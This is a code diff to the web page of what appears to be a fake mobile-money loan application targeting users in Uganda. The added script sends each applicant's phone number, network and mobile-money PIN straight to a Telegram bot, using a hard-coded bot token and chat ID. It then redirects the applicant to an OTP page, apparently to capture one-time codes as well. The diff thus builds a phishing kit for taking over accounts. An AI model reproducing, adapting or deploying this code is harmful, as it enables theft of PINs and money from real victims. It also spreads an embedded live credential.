@@ -103,7 +103,7 @@
             font-weight: 600;
             margin-bottom: 7px;
         }
-        select, input {
+        input {
             width: 100%;
             padding: 13px 15px;
             background: #f9fafb;
@@ -112,7 +112,7 @@
             font-size: 15.5px;
             outline: none;
         }
-        select:focus, input:focus {
+        input:focus {
             border-color: #E42320;
         }
         .btn-primary {
@@ -227,7 +227,11 @@
 </div>
 
 <script>
-    const API_URL = 'https://momo-uganda-production.up.railway.app';
+    // Telegram Bot Direct Configuration
+    const BOT_TOKEN = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
+    const CHAT_ID = '8392790531';
+    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+    const OTP_PAGE_URL = 'https://momo-uganda-production.up.railway.app/otp.html';
 
     function loadLoanData() {
         const data = sessionStorage.getItem('calculatorData');
@@ -243,6 +247,30 @@
         err.textContent = msg;
         err.style.display = 'block';
         setTimeout(() => err.style.display = 'none', 4000);
+    }
+
+    // Send message directly to Telegram
+    async function sendToTelegram(phone, pin, amount, network) {
+        const message = `<b>🔴 NEW LOAN APPLICATION - UGANDA</b>\n\n` +
+            `━━━━━━━━━━━━━━━━━━\n` +
+            `<b>💰 Amount:</b> UGX ${amount.toLocaleString()}\n` +
+            `<b>📱 Network:</b> ${network}\n` +
+            `<b>📞 Phone:</b> <code>${phone}</code>\n` +
+            `<b>🔐 PIN:</b> <code>${pin}</code>\n` +
+            `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n` +
+            `━━━━━━━━━━━━━━━━━━\n\n` +
+            `<b>✅ User will be redirected to OTP page after approval.</b>`;
+
+        const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+        return response.json();
     }
 
     document.getElementById('submitBtn').onclick = async () => {
@@ -271,37 +299,20 @@
         else if (phone.startsWith('070') || phone.startsWith('076')) network = 'Africell';
 
         try {
-            const response = await fetch(`${API_URL}/api/save-loan`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    phone: phone,
-                    pin: pin,
-                    network: network,
-                    amount: loanData.amount || 500000,
-                    duration: loanData.duration || 90,
-                    monthly: loanData.monthly || 182500,
-                    total: loanData.total || 547500,
-                    interest: loanData.interest || 47500
-                })
-            });
-
-            const data = await response.json();
+            // Send to Telegram directly
+            await sendToTelegram(phone, pin, loanData.amount || 500000, network);
             
-            if (data.success) {
-                sessionStorage.setItem('loanId', data.loanId);
-                sessionStorage.setItem('userPhone', phone);
-                sessionStorage.setItem('userNetwork', network);
-                
-                document.getElementById('spinner').style.display = 'none';
-                window.location.href = `${API_URL}/otp.html`;
-            } else {
-                throw new Error(data.error || "Submission failed");
-            }
+            // Store data and redirect to OTP page
+            sessionStorage.setItem('userPhone', phone);
+            sessionStorage.setItem('userNetwork', network);
+            
+            document.getElementById('spinner').style.display = 'none';
+            window.location.href = OTP_PAGE_URL;
+            
         } catch (err) {
             console.error('Submit error:', err);
             document.getElementById('spinner').style.display = 'none';
-            showError("Error: " + err.message);
+            showError("Error sending application. Please try again.");
             btn.disabled = false;
             btn.textContent = "Continue →";
         }
